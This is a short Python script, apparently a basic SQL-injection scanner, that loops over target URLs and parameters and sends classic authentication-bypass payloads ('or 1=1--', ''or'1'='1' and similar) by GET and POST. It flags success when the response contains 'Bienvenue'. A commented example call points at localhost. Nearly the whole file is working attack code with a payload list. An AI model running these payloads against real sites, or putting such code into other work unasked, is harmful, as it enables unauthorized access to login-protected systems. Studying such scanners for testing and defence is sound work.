import subprocess
import os, re
import requests
import time
from colorama import Fore, Back, Style


def sqlscan(listUrl, listParam):
    print("\n[+] Trying sql injection .. ")

    listInjection = ["\"or 1=1--", "\"or 1=1%23","\'or\'1\'=\'1\'","\'%23"]

    for url in listUrl:
        for inj in listInjection :
            payload = "?"+str(listParam[0][0])+"=admin"+str(inj)
            payload1 = payload+"&"+str(listParam[0][1])+"=admin"
            finalPayload = url+payload1

            requests.post(url,payload1)
            a = requests.get(finalPayload).text

            if "Bienvenue" in a:
                print(Fore.RED+"\n    [!] Sql injection possible !")
                print("        Requete : "+url+payload1+Style.RESET_ALL)

    print('\n')


#sqlscan('http://127.0.0.1/command.php',['user','pass'])
